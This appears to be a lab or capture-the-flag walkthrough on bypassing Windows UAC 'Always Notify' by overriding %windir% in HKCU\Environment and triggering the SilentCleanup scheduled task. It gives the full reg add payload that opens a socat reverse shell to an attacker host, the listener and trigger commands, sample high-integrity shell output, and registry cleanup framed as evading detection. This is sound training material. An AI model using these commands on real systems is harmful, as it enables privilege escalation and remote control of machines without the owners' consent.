# Bypassing UAC: Environment Variable Expansion

## Bypassing "Always Notify"

On default Windows configurations, you can abuse system configuration applications to bypass UAC, as many have the `autoElevate` flag set in their manifests. However, if UAC is set to **"Always Notify"**, tools like `fodhelper` are ineffective because they require user approval via the UAC prompt. This blocks several known bypass methods, but not all hope is lost.

## Scheduled Task Abuse

Some scheduled tasks can be run by any user but execute with the highest privileges available to the caller. These tasks are designed to run without user interaction, regardless of the UAC security level. If a scheduled task requires elevation, it will automatically get it without prompting the user.

### Case Study: Disk Cleanup Scheduled Task

> **Note:** Disable Windows Defender for this task to avoid issues. Use the provided shortcut on your desktop to do so.

#### Task Scheduler Configuration

- The Disk Cleanup task runs with the **Users** account, inheriting the privileges of the calling user.
- The **Run with highest privileges** option uses the highest privilege token available (high IL for admins).
- If a non-admin invokes the task, it runs with medium IL, so the bypass won't work for them.

#### Actions and Settings

- The task can be run on-demand, executing:
    ```
    %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
    ```
- Since the command uses environment variables, we can inject commands by overriding them.

#### Overriding `%windir%` via Registry

You can override `%windir%` by creating an entry in `HKCU\Environment`. For example, to execute a reverse shell using socat:

```sh
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM " /f
```

- The `&REM` at the end comments out the rest of the command.
- The resulting command executed by Disk Cleanup:
    ```
    cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
    ```

## Exploit Steps

1. **Set up a listener for the reverse shell:**
     ```sh
     nc -lvp 4446
     ```

2. **Connect to the backdoor (if needed):**
     ```sh
     nc MACHINE_IP 9999
     ```

3. **Write the payload and execute the Disk Cleanup task:**
     ```sh
     reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
     schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
     ```

4. **On the attacker's machine, you should receive a shell:**
     ```
     user@kali$ nc -lvp 4446
     Listening on 0.0.0.0 4446
     Connection received on 10.10.183.127 25631
     Microsoft Windows [Version 10.0.17763.1821]
     (c) 2018 Microsoft Corporation. All rights reserved.

     C:\Windows\system32>whoami /groups | find "Label"
     Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
     ```

5. **Retrieve the Disk Cleanup flag:**
     ```sh
     C:\flags\GetFlag-diskcleanup.exe
     ```
     > *Note: The flag is only returned if you successfully bypassed UAC and have a high integrity shell via socat.*

## Cleanup

After exploiting, clean up the registry to avoid detection and restore system functionality:

```sh
reg delete "HKCU\Environment" /v "windir" /f
```

> **Note:** Removing the registry key is essential, as many Windows components rely on `%windir%`. Failure to do so may cause system issues.
